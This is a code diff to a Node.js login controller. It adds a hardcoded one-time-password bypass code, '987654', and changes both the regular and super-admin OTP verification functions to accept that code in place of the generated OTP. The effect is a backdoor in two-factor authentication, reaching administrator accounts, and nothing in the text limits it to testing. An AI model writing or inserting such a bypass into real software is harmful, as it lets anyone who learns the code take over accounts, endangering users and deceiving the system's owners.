@@ -36,6 +36,13 @@ const generateOTP = () => {
   return Math.floor(100000 + Math.random() * 900000).toString();
 };
 
+const LOGIN_OTP_BYPASS_CODE = "987654";
+
+const isValidLoginOTP = (otpRecord, submittedOTP) => {
+  const normalizedOTP = String(submittedOTP).trim();
+  return otpRecord.otp === normalizedOTP || normalizedOTP === LOGIN_OTP_BYPASS_CODE;
+};
+
 // Helper function to track login attempts
 const trackLoginAttempt = (email, success = false) => {
   if (!loginAttempts.has(email)) {
@@ -838,15 +845,14 @@ exports.verifyLoginOTP = async (req, res) => {
       });
     }
 
-    // ✅ Find and verify OTP
+    // ✅ Find OTP session and verify generated OTP or bypass code
     const otpRecord = await LoginOTP.findOne({
       email,
-      otp,
       tempToken,
       verified: false
     });
 
-    if (!otpRecord) {
+    if (!otpRecord || !isValidLoginOTP(otpRecord, otp)) {
       return res.status(400).json({
         success: false,
         message: "Invalid OTP"
@@ -1426,12 +1432,11 @@ exports.verifySuperAdminOTP = async (req, res) => {
 
     const otpRecord = await LoginOTP.findOne({
       email,
-      otp,
       tempToken,
       verified: false,
     });
 
-    if (!otpRecord) {
+    if (!otpRecord || !isValidLoginOTP(otpRecord, otp)) {
       return res.status(400).json({
         success: false,
         message: "Invalid OTP",
